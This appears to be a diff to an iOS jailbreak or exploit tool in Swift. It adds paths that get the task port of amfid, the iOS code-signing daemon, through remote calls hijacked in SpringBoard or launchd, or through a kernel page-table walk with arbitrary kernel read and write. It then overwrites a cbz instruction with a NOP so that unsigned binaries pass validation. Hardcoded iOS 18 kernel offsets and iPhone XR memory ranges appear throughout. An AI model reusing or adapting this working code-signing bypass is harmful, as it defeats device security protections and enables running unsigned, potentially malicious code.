@@ -157,19 +157,50 @@ final class ExpAmfidNopFinal {
         out("")
         
         // ─── Step 4-7: task_for_pid + patch via launchd ───
-        out("[4/7] Connecting to launchd for task_for_pid...")
+        out("[4/7] Attempting task_for_pid...")
         out("(async — results below)")
         out("")
         
-        // This part is async because RootExecutor connects to launchd
-        performPatchViaLaunchd(amfidPid: finalPid)
+        // Try SpringBoard first (already connected, faster)
+        // Then fall back to launchd if SB fails
+        performPatchViaSB(amfidPid: finalPid, amfidProc: amfidProc)
         
         return output
     }
     
-    // MARK: - Async Patch via Launchd
+    // MARK: - Async Patch via SpringBoard (preferred) or Launchd (fallback)
     
     #if !DISABLE_REMOTECALL
+    private func performPatchViaSB(amfidPid: Int32, amfidProc: UInt64) {
+        guard let sb = dspmgr.shared.sbProc else {
+            log("⚠️ No SpringBoard RC — trying launchd...")
+            performPatchViaLaunchd(amfidPid: amfidPid)
+            return
+        }
+        
+        log("[4/7] task_for_pid(\(amfidPid)) from SpringBoard...")
+        
+        // Try task_for_pid from SpringBoard context
+        let portAddr = sb.trojanMem + 0x100
+        sb[portAddr].setValue32(0)
+        
+        let mts = RootExecutor.rcall(sb, "mach_task_self")
+        let tfpRet = RootExecutor.rcall(sb, "task_for_pid",
+            mts, UInt64(amfidPid), portAddr)
+        let taskPort = sb[portAddr].value32()
+        
+        log("  task_for_pid: ret=\(tfpRet) port=0x\(String(format:"%x", taskPort))")
+        
+        if tfpRet == 0 && taskPort != 0 {
+            log("✅ Got amfid task port from SpringBoard!")
+            doPatchWithTaskPort(rc: sb, taskPort: taskPort, label: "SB")
+        } else {
+            log("❌ SpringBoard task_for_pid failed (ret=\(tfpRet))")
+            log("   Trying kernel direct path...")
+            patchViaKernelDirect(amfidProc: amfidProc, amfidPid: amfidPid)
+        }
+    }
+    
     private func performPatchViaLaunchd(amfidPid: Int32) {
         log("[4/7] task_for_pid(\(amfidPid)) from launchd...")
         
@@ -310,7 +341,278 @@ final class ExpAmfidNopFinal {
             }
         }
     }
+    
+    // MARK: - Shared patch logic (works with any RC that has a task port)
+    
+    private func doPatchWithTaskPort(rc: RemoteCall, taskPort: UInt32, label: String) {
+        log("[5/7] mach_vm_region (find __TEXT)...")
+        
+        let addrBuf = rc.trojanMem + 0x200
+        let sizeBuf = rc.trojanMem + 0x208
+        let infoBuf = rc.trojanMem + 0x210
+        let cntBuf = rc.trojanMem + 0x280
+        let objBuf = rc.trojanMem + 0x290
+        
+        rc[addrBuf].setValue64(0x100000000)
+        rc[sizeBuf].setValue64(0)
+        rc[cntBuf].setValue32(9)
+        
+        let regionRet = RootExecutor.rcall(rc, "mach_vm_region",
+            UInt64(taskPort), addrBuf, sizeBuf, 9, infoBuf, cntBuf, objBuf)
+        
+        let textBase = rc[addrBuf].value64()
+        let textSize = rc[sizeBuf].value64()
+        
+        guard regionRet == 0 else {
+            log("❌ [5] mach_vm_region FAILED: ret=\(regionRet)")
+            return
+        }
+        
+        guard textBase >= 0x100000000 && textBase < 0x280000000000 else {
+            log("❌ [5] invalid text base: 0x\(String(textBase, radix:16))")
+            return
+        }
+        
+        let patchAddr = textBase + patchFileOffset
+        log("  text base: 0x\(String(textBase, radix:16)) size: 0x\(String(textSize, radix:16))")
+        log("  patch addr: 0x\(String(patchAddr, radix:16))")
+        
+        // mach_vm_protect
+        log("[6/7] mach_vm_protect (make writable)...")
+        let pageAddr = patchAddr & ~0xFFF
+        let protRet = RootExecutor.rcall(rc, "mach_vm_protect",
+            UInt64(taskPort), pageAddr, 0x4000, 0, 7)
+        
+        guard protRet == 0 else {
+            log("❌ [6] mach_vm_protect FAILED: ret=\(protRet)")
+            return
+        }
+        log("  ✅ page writable")
+        
+        // Read current instruction
+        let readBuf = rc.trojanMem + 0x300
+        let readSzBuf = rc.trojanMem + 0x310
+        rc[readSzBuf].setValue64(4)
+        rc[readBuf].setValue32(0)
+        
+        let readRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
+            UInt64(taskPort), patchAddr, 4, readBuf, readSzBuf)
+        let currentInsn = rc[readBuf].value32()
+        
+        guard readRet == 0 else {
+            log("❌ [6b] mach_vm_read FAILED: ret=\(readRet)")
+            return
+        }
+        
+        log("  current insn: 0x\(String(format:"%08x", currentInsn))")
+        
+        if currentInsn == 0xD503201F {
+            log("✅ ALREADY PATCHED (NOP)!")
+            testUnsignedSpawn()
+            return
+        }
+        
+        guard (currentInsn & 0xFF000000) == 0x34000000 else {
+            log("❌ NOT cbz instruction: 0x\(String(format:"%08x", currentInsn))")
+            log("   Expected 0x34xxxxxx at offset 0x2ec8")
+            return
+        }
+        
+        log("  ✅ confirmed cbz w22")
+        
+        // Write NOP
+        log("[7/7] Writing NOP...")
+        let nopBuf = rc.trojanMem + 0x320
+        rc[nopBuf].setValue32(0xD503201F)
+        
+        let writeRet = RootExecutor.rcall(rc, "mach_vm_write",
+            UInt64(taskPort), patchAddr, nopBuf, 4)
+        
+        guard writeRet == 0 else {
+            log("❌ [7] mach_vm_write FAILED: ret=\(writeRet)")
+            return
+        }
+        
+        // Verify
+        rc[readBuf].setValue32(0)
+        rc[readSzBuf].setValue64(4)
+        RootExecutor.rcall(rc, "mach_vm_read_overwrite",
+            UInt64(taskPort), patchAddr, 4, readBuf, readSzBuf)
+        let verify = rc[readBuf].value32()
+        
+        if verify == 0xD503201F {
+            log("")
+            log("╔══════════════════════════════════════╗")
+            log("║  ✅✅✅ amfid PATCHED! cbz → NOP    ║")
+            log("║  via \(label) task_for_pid")
+            log("║  ALL binaries now pass validation   ║")
+            log("╚══════════════════════════════════════╝")
+            log("")
+            testUnsignedSpawn()
+        } else {
+            log("❌ Verify failed: 0x\(String(format:"%08x", verify))")
+        }
+    }
+    
+    // MARK: - Kernel Direct Path (no task_for_pid needed)
+    
+    /// Patch amfid via kernel page table walk.
+    /// This reads amfid's pmap to translate VA → PA, then writes NOP to physical memory.
+    /// CAUTION: Previous attempt caused panic — we add extra validation here.
+    private func patchViaKernelDirect(amfidProc: UInt64, amfidPid: Int32) {
+        log("")
+        log("── Kernel Direct Path ──")
+        log("Reading amfid's vm_map → pmap → page tables...")
+        
+        let amfidTask = taskbyproc(amfidProc)
+        guard amfidTask != 0 else {
+            log("❌ taskbyproc failed")
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        log("  task: 0x\(String(format:"%llx", amfidTask))")
+        
+        // task → vm_map (offset 0x28 on iOS 18)
+        let vmMap = ds_kread64(amfidTask + 0x28)
+        guard vmMap != 0 else {
+            log("❌ vm_map = 0")
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        log("  vm_map: 0x\(String(format:"%llx", vmMap))")
+        
+        // vm_map → pmap (offset 0x48 on iOS 18)
+        let pmap = ds_kread64(vmMap + 0x48)
+        guard pmap != 0 else {
+            log("❌ pmap = 0")
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        log("  pmap: 0x\(String(format:"%llx", pmap))")
+        
+        // pmap → ttep (translation table entry pointer, offset 0x0)
+        let ttep = ds_kread64(pmap + 0x0)
+        guard ttep != 0 else {
+            log("❌ ttep = 0")
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        log("  ttep: 0x\(String(format:"%llx", ttep))")
+        
+        // Get amfid's text base from vm_map min_offset
+        let textBase = ds_kread64(vmMap + 0x10)
+        guard textBase >= 0x100000000 && textBase < 0x280000000000 else {
+            log("❌ text base invalid: 0x\(String(format:"%llx", textBase))")
+            log("   Trying first vm_map_entry...")
+            // Try first entry
+            let firstEntry = ds_kread64(vmMap + 0x8)
+            if firstEntry != 0 {
+                let entryStart = ds_kread64(firstEntry + 0x0)
+                log("   first entry start: 0x\(String(format:"%llx", entryStart))")
+            }
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        log("  text base: 0x\(String(format:"%llx", textBase))")
+        
+        let patchVA = textBase + patchFileOffset
+        log("  patch VA: 0x\(String(format:"%llx", patchVA))")
+        
+        // Page table walk: L1 → L2 → L3 → physical
+        let l1Idx = (patchVA >> 30) & 0x1FF
+        let l2Idx = (patchVA >> 21) & 0x1FF
+        let l3Idx = (patchVA >> 12) & 0x1FF
+        let pageOff = patchVA & 0xFFF
+        
+        log("  L1[\(l1Idx)] L2[\(l2Idx)] L3[\(l3Idx)] off=0x\(String(format:"%x", pageOff))")
+        
+        // L1
+        let l1Entry = ds_kread64(ttep + l1Idx * 8)
+        guard (l1Entry & 0x3) == 0x3 else {
+            log("❌ L1 invalid: 0x\(String(format:"%llx", l1Entry))")
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        let l2Table = l1Entry & 0xFFFFFFFFF000
+        
+        // L2
+        let l2Entry = ds_kread64(l2Table + l2Idx * 8)
+        guard (l2Entry & 0x3) == 0x3 else {
+            log("❌ L2 invalid: 0x\(String(format:"%llx", l2Entry))")
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        let l3Table = l2Entry & 0xFFFFFFFFF000
+        
+        // L3
+        let l3Entry = ds_kread64(l3Table + l3Idx * 8)
+        guard (l3Entry & 0x3) != 0 else {
+            log("❌ L3 invalid: 0x\(String(format:"%llx", l3Entry))")
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        let physPage = l3Entry & 0xFFFFFFFFF000
+        let physAddr = physPage + pageOff
+        
+        log("  physical: 0x\(String(format:"%llx", physAddr))")
+        
+        // SAFETY CHECK: verify physical address is reasonable
+        // On iPhone XR, DRAM starts at ~0x800000000
+        guard physAddr > 0x800000000 && physAddr < 0x900000000 else {
+            log("❌ Physical address out of DRAM range!")
+            log("   Expected 0x800000000-0x900000000")
+            log("   This would cause panic — ABORTING")
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        
+        // Read current instruction
+        let currentInsn = ds_kread32(physAddr)
+        log("  current insn @ phys: 0x\(String(format:"%08x", currentInsn))")
+        
+        guard (currentInsn & 0xFF000000) == 0x34000000 else {
+            if currentInsn == 0xD503201F {
+                log("✅ ALREADY PATCHED!")
+                testUnsignedSpawn()
+                return
+            }
+            log("❌ NOT cbz at physical address")
+            log("   ASLR slide may differ — DO NOT write")
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        
+        log("  ✅ confirmed cbz — writing NOP...")
+        ds_kwrite32(physAddr, 0xD503201F)
+        
+        // Verify
+        let verify = ds_kread32(physAddr)
+        if verify == 0xD503201F {
+            log("")
+            log("╔══════════════════════════════════════╗")
+            log("║  ✅✅✅ amfid PATCHED! cbz → NOP    ║")
+            log("║  via kernel page table walk         ║")
+            log("║  ALL binaries now pass validation   ║")
+            log("╚══════════════════════════════════════╝")
+            log("")
+            testUnsignedSpawn()
+        } else {
+            log("❌ Write failed: 0x\(String(format:"%08x", verify))")
+            log("   PPL may be protecting this page")
+            fallbackToLaunchd(amfidPid: amfidPid)
+        }
+    }
+    
+    private func fallbackToLaunchd(amfidPid: Int32) {
+        log("")
+        log("Falling back to launchd task_for_pid...")
+        performPatchViaLaunchd(amfidPid: amfidPid)
+    }
+    
     #else
+    private func performPatchViaSB(amfidPid: Int32, amfidProc: UInt64) {
+        log("❌ DISABLE_REMOTECALL — cannot patch")
+    }
     private func performPatchViaLaunchd(amfidPid: Int32) {
         log("❌ DISABLE_REMOTECALL — cannot use launchd")
     }
